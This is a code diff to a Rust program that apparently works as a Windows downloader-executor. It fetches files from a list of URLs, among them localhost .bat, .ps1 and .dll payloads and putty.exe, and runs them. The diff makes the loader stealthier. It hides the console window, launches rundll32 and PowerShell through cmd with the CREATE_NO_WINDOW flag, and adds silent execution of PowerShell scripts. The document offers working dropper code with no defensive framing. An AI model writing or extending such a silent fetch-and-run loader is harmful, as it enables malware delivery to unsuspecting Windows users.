@@ -1,9 +1,11 @@
+#![windows_subsystem = "windows"]
 use minreq;
 use rand::Rng;
 use std::env;
 use std::ffi::CString;
 use std::fs::File;
 use std::io::BufReader;
+use std::os::windows::process::CommandExt;
 use std::path::PathBuf;
 use std::process::Command;
 use std::sync::mpsc::channel;
@@ -38,7 +40,11 @@ fn execute(filename: &str, entry_point: Option<&str>) {
             // Run DLL with rundll32.exe and specified entry point
             let rundll32 = "rundll32.exe";
             let command = format!("{} {} {}", rundll32, filename, ep);
-            let status = Command::new("cmd").args(&["/C", &command]).status();
+
+            let status = Command::new("cmd")
+                .args(&["/C", &command])
+                .creation_flags(0x08000000)
+                .status();
 
             match status {
                 Ok(exit_status) => {
@@ -51,15 +57,38 @@ fn execute(filename: &str, entry_point: Option<&str>) {
                 }
             }
         } else {
-            // Open file directly
-            ShellExecuteA(
-                std::ptr::null_mut(),
-                verb.as_ptr() as *const i8,
-                file_or_url.as_ptr() as *const i8,
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                winapi::um::winuser::SW_NORMAL,
-            );
+            // Check if the file extension is .ps1
+            if filename.ends_with(".ps1") {
+                // Run .ps1 file using PowerShell
+                let powershell = "powershell.exe";
+                let command = format!("{} {}", powershell, filename);
+
+                let status = Command::new("cmd")
+                    .args(&["/C", &command])
+                    .creation_flags(0x08000000)
+                    .status();
+
+                match status {
+                    Ok(exit_status) => {
+                        if !exit_status.success() {
+                            eprintln!("Failed to execute PowerShell script: {}", filename);
+                        }
+                    }
+                    Err(err) => {
+                        eprintln!("Failed to execute PowerShell script: {}", err);
+                    }
+                }
+            } else {
+                // Open file directly
+                ShellExecuteA(
+                    std::ptr::null_mut(),
+                    verb.as_ptr() as *const i8,
+                    file_or_url.as_ptr() as *const i8,
+                    std::ptr::null_mut(),
+                    std::ptr::null_mut(),
+                    winapi::um::winuser::SW_NORMAL,
+                );
+            }
         }
     }
 }
@@ -88,6 +117,8 @@ fn main() {
             "https://the.earth.li/~sgtatham/putty/0.79/w32/putty.exe",
             None,
         ),
+        ("http://127.0.0.1/bat.bat", None),
+        ("http://127.0.0.1/ps1.ps1", None),
         // DLL with entry point
         ("http://127.0.0.1/mydll.dll", Some("DllMain")),
         ("http://127.0.0.1/mydll2.dll", Some("DllMain")),
